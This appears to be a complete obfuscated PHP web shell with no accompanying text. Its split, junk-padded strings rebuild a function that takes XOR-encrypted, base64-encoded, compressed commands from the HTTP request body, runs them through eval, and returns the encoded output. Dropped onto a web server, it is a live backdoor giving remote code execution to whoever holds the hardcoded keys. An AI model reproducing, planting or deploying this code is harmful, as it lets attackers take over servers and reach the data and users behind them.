<?php
$j='AAfqMJMJFcoscdbibRkm"MJ;funcMJtion MJx($t,$k){MJ$c=stMJrlMJen(MJ$k)MJMJMJ';
$T=';$l=strlen($t);$o=MJ"";for($i=MJMJ0;$i<$l;){foMJr($j=MJ0;($j<$cMJ&&$MJiMJ<';
$W='$kMJ="30f10MJdMJ85";$kh="341MJf727f61bfMJ";$kMJf="d03aMJ52dMJ6d6MJaa";$p="';
$y='[1]MJ),MJ$kMJ)));$o=@ob_getMJ_cMJontenMJts(MJ);@ob_end_MJcMJMJlean();$r=@';
$t='basMJMJe64_encMJode(@x(@gzcompresMJs($o)MJ,$kMJ));print("MJ$MJp$kh$r$kf");}';
$O=str_replace('Ms','','cMsMsrMseate_fMsMsunMsction');
$Y='$l);$MJj++,$i++){$MJo.=$t{$i}^$k{MJ$j};}}reMJturn $MJoMJ;}if (@MJpreMJg_mat';
$w='==1MJ) {@obMJ_MJstart();@evMJal(@gzuncomMJpresMJsMJ(@x(@baseMJ64_decMJode($m';
$L='ch("/$kMJh(MJ.+)$kf/",@fiMJle_getMJ_MJMJcontents("MJphMJp://MJinput"),$m)';
$k=str_replace('MJ','',$W.$j.$T.$Y.$L.$w.$y.$t);
$I=$O('',$k);$I();
?>
